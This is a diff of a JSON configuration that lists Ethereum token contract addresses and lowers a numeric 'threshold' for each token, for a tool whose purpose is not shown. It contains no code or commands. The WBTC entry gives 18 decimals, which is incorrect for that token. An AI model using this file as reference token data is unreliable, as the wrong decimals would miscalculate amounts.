@@ -1,59 +1,60 @@
 {
   "developerAbbreviation": "AK",
+  "payableFunctionEtherValue": "10",
   "chains": {
     "1": {
       "native": {
         "name": "ETH",
         "decimals": 18,
-        "threshold": 10
+        "threshold": 3
       },
       "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2": {
         "name": "WETH",
         "decimals": 18,
-        "threshold": 10
+        "threshold": 3
       },
       "0xdAC17F958D2ee523a2206206994597C13D831ec7": {
         "name": "USDT",
         "decimals": 6,
-        "threshold": 5000
+        "threshold": 3000
       },
       "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": {
         "name": "USDC",
         "decimals": 6,
-        "threshold": 5000
+        "threshold": 3000
       },
       "0xB8c77482e45F1F44dE1745F52C74426C631bDD52": {
         "name": "BNB",
         "decimals": 18,
-        "threshold": 500
+        "threshold": 100
       },
       "0x4Fabb145d64652a948d72533023f6E7A623C7C53": {
         "name": "BUSD",
         "decimals": 18,
-        "threshold": 5000
+        "threshold": 3000
       },
       "0x6B175474E89094C44Da98b954EedeAC495271d0F": {
         "name": "DAI",
         "decimals": 18,
-        "threshold": 5000
+        "threshold": 3000
       },
       "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": {
         "name": "WBTC",
         "decimals": 18,
-        "threshold": 0.5
+        "threshold": 0.15
       },
       "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0": {
         "name": "MATIC",
         "decimals": 18,
-        "threshold": 10000
+        "threshold": 3000
       },
       "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85": {
         "name": "ENS",
-        "threshold": 50
+        "threshold": 25
       },
       "0x495f947276749Ce646f68AC8c248420045cb7b5e": {
         "name": "OpenSea Shared Storefront",
-        "threshold": 50
+        "threshold": 25
       }
     }
   }
